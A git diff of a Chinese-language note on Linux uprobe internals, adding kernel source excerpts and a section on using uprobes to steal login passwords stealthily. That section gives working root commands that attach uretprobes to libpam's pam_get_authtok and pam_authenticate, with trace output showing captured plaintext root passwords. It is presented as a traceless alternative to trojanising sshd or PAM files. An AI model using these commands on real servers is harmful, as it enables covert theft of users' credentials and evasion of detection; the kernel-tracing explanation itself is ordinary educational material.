@@ -223,9 +223,18 @@ uprobes和kprobes类似，不过它也允许对userspace functions跟踪。
 uprobes工作原理：
 
 `uprobe`除了`debugfs`和`tracefs`外没有提供其他的接口，通过`file_operations`绑定了特定的功能（kprobes也是这么做的，不过也提供了register接口）
-
-下述file_operations绑定到`/sys/kernel/debug/tracing/uprobe_events`
-
+```c
+static __init int init_uprobe_trace(void)
+{
+	int ret;
+	...
+	trace_create_file("uprobe_events", TRACE_MODE_WRITE, NULL,
+				    NULL, &uprobe_events_ops);
+	...
+	return 0;
+}
+```
+基于`tracefs`，将下述file_operations绑定到`/sys/kernel/debug/tracing/uprobe_events`
 ```c
 static const struct file_operations uprobe_events_ops = {
 	.owner		= THIS_MODULE,
@@ -236,12 +245,111 @@ static const struct file_operations uprobe_events_ops = {
 	.write		= probes_write,
 };
 ```
-
 * 当向`uprobe_events`写入uprobe event时
-
-  * `probes_write` -> `traceprobe_probes_write`
-
+`probes_write` -> `create_or_delete_trace_uprobe` -> `trace_uprobe_create` -> `trace_probe_create` -> `__trace_uprobe_create`
   
+-> `alloc_trace_uprobe`创建一个`uprobe`并初始化
+```c
+static struct trace_uprobe *
+alloc_trace_uprobe(const char *group, const char *event, int nargs, bool is_ret)
+{
+	struct trace_uprobe *tu;
+	int ret;
+
+	tu = kzalloc(struct_size(tu, tp.args, nargs), GFP_KERNEL);
+	if (!tu)
+		return ERR_PTR(-ENOMEM);
+
+	ret = trace_probe_init(&tu->tp, event, group, true);
+	if (ret < 0)
+		goto error;
+
+	dyn_event_init(&tu->devent, &trace_uprobe_ops);
+	tu->consumer.handler = uprobe_dispatcher;			// uprobe handler
+	if (is_ret)
+		tu->consumer.ret_handler = uretprobe_dispatcher;	// retuprobe handler
+	init_trace_uprobe_filter(tu->tp.event->filter);
+	return tu;
+
+error:
+	kfree(tu);
+
+	return ERR_PTR(ret);
+}
+```
+`register_trace_uprobe`注册uprobe
+`register_uprobe_event`将uprobe注册到全局probe，同时创建对应的`debugfs`
+当对应的uprobe_event 被 `enable`时，`__uprobe_register`
+```c
+ retry:
+	uprobe = alloc_uprobe(inode, offset, ref_ctr_offset);
+	if (!uprobe)
+		return -ENOMEM;
+	if (IS_ERR(uprobe))
+		return PTR_ERR(uprobe);
+
+	/*
+	 * We can race with uprobe_unregister()->delete_uprobe().
+	 * Check uprobe_is_active() and retry if it is false.
+	 */
+	down_write(&uprobe->register_rwsem);
+	ret = -EAGAIN;
+	if (likely(uprobe_is_active(uprobe))) {
+		consumer_add(uprobe, uc);
+		ret = register_for_each_vma(uprobe, uc);
+		if (ret)
+			__uprobe_unregister(uprobe, uc);
+	}
+```
+`register_for_each_vma`在对应的uprobe文件的进程内存map偏移处下断点（和kprobe类似）
+```c
+		if (is_register) {
+			/* consult only the "caller", new consumer. */
+			if (consumer_filter(new,
+					UPROBE_FILTER_REGISTER, mm))
+				err = install_breakpoint(uprobe, mm, vma, info->vaddr);
+		}
+```
+##### 利用uprobe窃听用户密码
+如何无痕的窃取Linux服务器密码
+云上常见的窃取服务器密码的方式基本都是“插马”，在`ssh/sshd/pam.so`等文件的用户认证函数中插入一段代码，将认证成功的密码记录在某个文件中或者`curl`外带出去。这种做法很常见，但是很容易被识破，毕竟基础文件被更改了。
+那有没有办法做到非侵入式的呢，当然有的，`uprobe`就是一个很好的选择。
+uprobe是linux提供的众多trace机制之一，可以用于trace用户态程序、文件的执行。
+基本的语法我就不多介绍了，推荐直接读官方文档`uprobetracer.rst`。
+
+uprobe的实现原理和kprobe类似，都是在内存中修改指定函数地址指令为`int 3`，
+
+pam认证的流程也不多讲了，关键的两个api: `pam_authenticate`和`pam_get_authtok`
+pam_get_authtok执行完后rdi寄存器指向`pam_handle`结构体，该结构体偏移`48`位置就是认证的用户名`user`；
+`rdx`寄存器指向`authtok`，此时是明文的密码；
+pam_authenticate的返回值标记了此次认证是否成功。
+
+那么我的思路就是：
+uretprobe pam_get_authtok 获取用户名密码，uretprobe获取pam_authenticate返回值判断是不是认证成功（ret=0x0时）
+```
+root@tree-pc:/home/tree/code/tracepoint/uprobe# echo 'r /lib/x86_64-linux-gnu/libpam.so.0:0x59c0 username=+u0(+u48(%di)):string password=+u0(+u0(%dx)):string' > /sys/kernel/tracing/uprobe_events 
+root@tree-pc:/home/tree/code/tracepoint/uprobe# echo 'r /lib/x86_64-linux-gnu/libpam.so.0:0x3900 ret=$retval' >> /sys/kernel/tracing/uprobe_events 
+root@tree-pc:/home/tree/code/tracepoint/uprobe# echo 1 > /sys/kernel/tracing/events/uprobes/p_libpam_0x59c0/enable
+root@tree-pc:/home/tree/code/tracepoint/uprobe# echo 1 > /sys/kernel/tracing/events/uprobes/p_libpam_0x3900/enable
+root@tree-pc:/home/tree/code/tracepoint/uprobe# cat /sys/kernel/tracing/trace
+# tracer: nop
+#
+# entries-in-buffer/entries-written: 4/4   #P:6
+#
+#                                _-----=> irqs-off
+#                               / _----=> need-resched
+#                              | / _---=> hardirq/softirq
+#                              || / _--=> preempt-depth
+#                              ||| / _-=> migrate-disable
+#                              |||| /     delay
+#           TASK-PID     CPU#  |||||  TIMESTAMP  FUNCTION
+#              | |         |   |||||     |         |
+              su-75284   [005] ..... 20126.120031: p_libpam_0x59c0: (0x7feedde3d852 <- 0x7feedea0c9c0) username="root" password="pass123"
+              su-75284   [005] ..... 20127.888462: p_libpam_0x3900: (0x5586a3426266 <- 0x7feedea0a900) ret=0x7
+              su-75317   [002] ..... 20133.411487: p_libpam_0x59c0: (0x7f1855372852 <- 0x7f1855f419c0) username="root" password="ubt159"
+              su-75317   [002] ..... 20133.423021: p_libpam_0x3900: (0x555b081f4266 <- 0x7f1855f3f900) ret=0x0
+```
+这种无痕的方案就避免了对任何文件的更改，更难以发现。
 
 ##### tracepoints
 
@@ -325,7 +433,7 @@ static const struct file_operations uprobe_events_ops = {
 [linux-ftrace-uprobes](https://www.brendangregg.com/blog/2015-06-28/linux-ftrace-uprobe.html)
 
 [](https://nakryiko.com/categories/bpf/)
-
+[uprobe-trace](https://www.brendangregg.com/blog/2015-06-28/linux-ftrace-uprobe.html)
 
 
 
